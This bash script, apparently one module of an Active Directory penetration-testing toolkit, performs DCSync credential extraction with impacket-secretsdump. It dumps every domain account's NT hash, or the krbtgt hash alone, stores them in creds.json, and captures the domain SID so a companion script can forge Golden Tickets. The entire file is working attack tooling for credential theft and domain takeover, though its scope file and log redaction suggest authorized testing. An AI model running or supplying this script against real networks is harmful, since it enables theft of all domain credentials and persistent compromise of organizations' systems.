#!/usr/bin/env bash
# =============================================================================
#  dcsync.sh  —  DCSync credential extraction via impacket-secretsdump  (ATOMIC)
# =============================================================================
#  Attack-chain role: with replication rights (Domain Admin, or a principal
#  granted DS-Replication-Get-Changes[-All] — see dacl_abuse.sh -T DCSync),
#  pull password hashes straight from the DC without touching a disk.
#
#  Modes (-m / --mode):
#    full     dump all domain accounts (-just-dc)
#    single   dump one account (--account, default krbtgt)
#
#  Every recovered NT hash is appended to creds.json. The krbtgt hash is tagged
#  distinctly (goldenticket.sh consumes it), and the domain SID is captured to a
#  state file so goldenticket.sh can read it automatically.
# =============================================================================
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" >/dev/null 2>&1 && pwd)"
SCRIPT_ARGS="$*"
source "$SCRIPT_DIR/lib/common.sh"

usage() { cat <<'EOF'
dcsync.sh — DCSync credential extraction via impacket-secretsdump (ATOMIC)

USAGE:   ./dcsync.sh [-m full|single] [--account name] [-t dc] [-d domain]
EXAMPLE: ./dcsync.sh -m single --account krbtgt    # just what goldenticket needs
         ./dcsync.sh -m full                        # whole domain

FLAGS:
  -m, --mode <full|single>  dump all accounts (full) or one (single)
      --account <name>      account for single mode (default krbtgt)
  -h, --help                this help
  (shared flags -t/-d/--dc-ip: --help-common)

WHAT IT DOES: secretsdump -just-dc; stores every NT hash in creds.json (krbtgt
  tagged distinctly), and records the domain SID to state/ for goldenticket.sh.
PREREQS: replication rights (Domain Admin, or a principal granted DCSync).
EOF
}

MODE="full" ACCOUNT="krbtgt"

parse_common_args "$@"
set -- "${COMMON_REMAINING[@]}"
while [[ $# -gt 0 ]]; do
  case "$1" in
    -m|--mode) MODE="$2"; shift 2 ;;
    --account) ACCOUNT="$2"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *) log_warn "ignoring unknown arg: $1"; shift ;;
  esac
done

[[ -n "$TARGET" ]] || die "no target: set scope.txt or pass -t <dc>"
require_creds "$DOMAIN_OVERRIDE"
DOMAIN="$(resolve_domain)"
need_cmd impacket-secretsdump

log_begin
announce_loot
log_info "DCSync mode=${MODE}$([[ "$MODE" == single ]] && echo " account=${ACCOUNT}") as ${DOMAIN}/${SEL_USER}"

# Capture the domain SID (needed later for Golden Ticket forging). Best-effort.
if command -v impacket-lookupsid >/dev/null 2>&1; then
  LS_CMD="impacket-lookupsid $(imp_target) $(imp_secret_flags) 0"
  log_run "$LS_CMD"; exec_capture "$LS_CMD"
  sid="$(printf '%s' "$LAST_OUTPUT" | grep -oiE 'S-1-5-21(-[0-9]+){3}' | head -n1)"
  if [[ -n "$sid" ]]; then record_domain_sid "$sid" "$DOMAIN"; log_ok "domain SID: ${sid} (saved to $(sid_file "$DOMAIN"))"; fi
  log_output
fi

# Build and run the secretsdump command. -outputfile lands the .ntds/.sam-style
# artifacts in this run's loot dir instead of the current directory.
OUTPREFIX="$(loot_dir)/secretsdump"
DUMP="impacket-secretsdump -just-dc -dc-ip ${DC} -outputfile '${OUTPREFIX}' $(imp_target) $(imp_secret_flags)"
[[ "$MODE" == "single" ]] && DUMP="impacket-secretsdump -just-dc-user $(printf '%q' "$ACCOUNT") -dc-ip ${DC} -outputfile '${OUTPREFIX}' $(imp_target) $(imp_secret_flags)"

# Sensitive ordering: capture → parse+store every NT hash (which tracks them) →
# THEN log_output, so no dumped hash appears unredacted in the master log.
log_run "$DUMP"; exec_capture "$DUMP"

count=0 got_krbtgt=0
while IFS= read -r line; do
  # NTLM lines look like:  DOMAIN\user:RID:LMHASH:NTHASH:::   (or  user:RID:LM:NT:::)
  [[ "$line" =~ ^[^:]+:[0-9]+:[a-fA-F0-9]{32}:[a-fA-F0-9]{32}::: ]] || continue
  principal="${line%%:*}"                 # DOMAIN\user  or  user
  user="${principal##*\\}"                # strip DOMAIN\
  nt="$(printf '%s' "$line" | cut -d: -f4)"
  [[ -z "$nt" ]] && continue
  if [[ "${user,,}" == "krbtgt" ]]; then
    creds_add "$DOMAIN" "krbtgt" "ntlm_hash" "$nt" "DCSync krbtgt (for goldenticket.sh), $(date '+%F')"
    got_krbtgt=1
  else
    creds_add "$DOMAIN" "$user" "ntlm_hash" "$nt" "DCSync, $(date '+%F')"
  fi
  count=$((count+1))
done <<< "$LAST_OUTPUT"

log_output                                 # all dumped hashes now tracked → redacted
log_ok "stored ${count} NT hash(es) in creds.json"

if [[ "$got_krbtgt" -eq 1 ]]; then
  if [[ -n "$(get_domain_sid "$DOMAIN")" ]]; then
    log_ok "krbtgt + domain SID ready → goldenticket.sh can forge a Golden Ticket now"
  else
    log_warn "krbtgt captured but no domain SID recorded — pass --sid to goldenticket.sh or re-run so lookupsid succeeds"
  fi
fi

log_end "success"
